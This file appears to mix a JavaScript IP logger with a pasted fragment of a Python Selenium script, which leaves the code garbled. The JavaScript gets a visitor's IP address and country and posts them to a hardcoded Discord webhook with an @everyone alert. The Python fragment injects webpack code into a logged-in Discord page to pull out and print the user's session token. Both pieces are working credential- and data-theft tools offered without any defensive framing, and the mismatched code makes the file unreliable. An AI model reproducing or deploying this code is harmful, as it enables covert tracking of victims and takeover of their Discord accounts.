var webHookUrl = "https://discord.com/api/webhooks/1014965008062480474/AxtBOjLcd-s74Lgver5uoEkt8G-EDviXP3se6Ead6fU6if_elKIi12vhIlAo1qa98eXU";

$.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
  console.log(JSON.stringify(data, null, 2));
});

const request = async () => { // Calling a "synchronous" fetch
    const response = await fetch('https://api.db-ip.com/v2/free/self');
    const data = await response.json();
    console.log(data);

    // Declaring variables
    var ip = data.ipAddress;
    var country = data.countryName;

    // Open POST Request
    var postRequest = new XMLHttpRequest();
    postRequest.open("POST", webHookUrl);

    postRequest.setRequestHeader('Content-type', 'application/json');

    var params = {
        username:   "IP Log",
        avatar_url: "",
        content:    "**NOWA KURWA IP BOMBA** @everyone \n" + 
		    "__**:globe_with_meridians: IP Address:**__ \n" +
                    "`" + ip + "` \n \n" +
		    "__**Country:**__ \n" +
		    "`" + country + "`"
    }

    postRequest.send(JSON.stringify(params));

}
    while True:
        if discord_login != driver.current_url:
            print('Grabbing token..')
            token = driver.execute_script('''

    var req = webpackJsonp.push([
        [], {
            extra_id: (e, t, r) => e.exports = r
        },
        [
            ["extra_id"]
        ]
    ]);
    for (let e in req.c)
        if (req.c.hasOwnProperty(e)) {
            let t = req.c[e].exports;
            if (t && t.__esModule && t.default)
                for (let e in t.default) "getToken" === e && (token = t.default.getToken())
        }
    return token;   
                ''')
            print('---')
            print('Token grabbed:',token)
            break

    print('Task complete.')

if __name__ == '__main__':
    main()

request();
